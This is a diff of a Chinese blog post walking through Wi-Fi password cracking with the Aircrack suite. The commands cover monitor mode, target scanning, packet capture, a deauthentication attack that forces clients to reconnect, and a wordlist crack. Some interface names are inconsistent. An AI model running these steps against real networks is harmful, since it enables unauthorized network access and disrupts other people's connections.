@@ -1,7 +1,6 @@
 ---
 layout: post
 title: Aircrack破解wifi密码
-
 ---
 <img src="/images/fulls/03.jpg" class="fit image"> 
   
@@ -19,11 +18,11 @@ title: Aircrack破解wifi密码
 ```
 root@kali:~$ airmon-ng start wlan0
 ```
- ### 扫描目标wifi
+### 扫描目标wifi
  ```
  root@kali:~$ airodump-ng wlan0mon
  ```
- ### 开始抓握手包
+### 开始抓握手包
  ```
  root@kali:~$ airodump-ng --ivs -w abc -c 6 mon0 
  ```
@@ -32,7 +31,7 @@ root@kali:~$ airmon-ng start wlan0
  2. -w是将抓取的报文写入命名为abc并保存（之后会在当前文件夹保存为abc-01.ivs）
  3. -c后面跟频道CH，如这里的6 
  
- ### 强制客户端重连
+### 强制客户端重连
  ```
 aireplay-ng -0 1 -a AP的Mac地址 -c 客户端的Mac地址 interface
  ```
@@ -40,10 +39,10 @@ aireplay-ng -0 1 -a AP的Mac地址 -c 客户端的Mac地址 interface
  + -a :表示AP的Mac地址
  + -c ：表示客户端的Mac地址
  + interface：网卡
- ### 使用密码本破解
+ 
+### 使用密码本破解
  ```
   root@kali:~$ aircrack-ng abc-01.ivs -w pass-wifi.txt
  ```
-  +-w是指定我的密码本
+ *-w是指定我的密码本
 
-Sed lobortis urna ut mi volutpat, sit amet euismod sapien tincidunt. Nulla facilisi. Pellentesque quis tempus neque. Mauris dictum ac sapien nec congue. In hac habitasse platea dictumst. Duis id pellentesque nisl. Morbi eget massa magna.
